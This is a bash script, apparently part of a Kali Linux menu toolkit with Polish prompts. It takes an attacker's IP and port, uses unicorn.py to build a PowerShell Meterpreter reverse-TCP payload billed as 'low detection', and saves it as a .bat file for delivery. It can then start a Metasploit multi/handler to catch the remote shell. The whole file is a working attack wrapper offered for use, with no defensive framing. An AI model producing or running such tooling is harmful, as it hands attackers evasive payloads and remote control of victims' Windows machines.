#! /bin/bash
# LOW DETECTION POWERSHELL PAYLOAD 
echo "

 ███▄ ▄███▓▓█████▄▄▄█████▓ ▄▄▄        ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▒████▄    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██▒   ░██▒░▒████▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░  ░      ░ ░ ░  ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░      ░      ░    ░        ░   ▒   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
       ░      ░  ░              ░  ░      ░               ░  ░    ░ ░   ░           
                                                                                    
"
echo "Starting script... "
cd /home/kali/Desktop/KOZ1OLMENU/unicorn
read -r -p "Input IP of payload - " IP
read -r -p "Input port of payload - " PORT
./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop/powershell_attack.bat
cd /home/kali/Desktop/K0Z1OLMENU
while true
do
 read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
 
 case $ODPOWIEDZ in
     [yY][eE][sS]|[yY])
  echo "Uruchamiam skrypt... "
  sleep 3
  sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
  sudo ./K0Z1OLMENU.sh
 break
 ;;
     [nN][eE][sS]|[nN])
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done
while true
do
 read -r -p "Do you want start script again ? (y/n) - " ODPOWIEDZ2
 
 case $ODPOWIEDZ2 in
     [yY][eE][sS]|[yY])
  echo "Uruchamiam skrypt... "
  cd ..
  sudo ./K0Z1OLMENU.sh
 break
 ;;
     [nN][eE][sS]|[nN])
  echo "Thanks for using my script !"
  exit 1
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done